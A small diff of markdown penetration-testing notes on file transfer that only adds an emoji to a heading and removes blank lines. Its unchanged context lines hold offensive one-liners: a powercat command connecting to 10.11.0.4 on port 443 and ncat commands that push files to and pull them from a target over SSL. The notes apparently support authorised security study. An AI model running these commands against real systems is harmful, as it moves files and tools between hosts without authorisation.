@@ -1,4 +1,4 @@
-# Other Methods
+# ⭕ Other Methods
 
 ## netcat
 
@@ -34,8 +34,6 @@ powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
 ncat -nvlp port --ssl > out-file
 ncat -nv target-ip port --ssl < file-to-send
 ```
-
-
 
 ## LOLBines For Windows
 
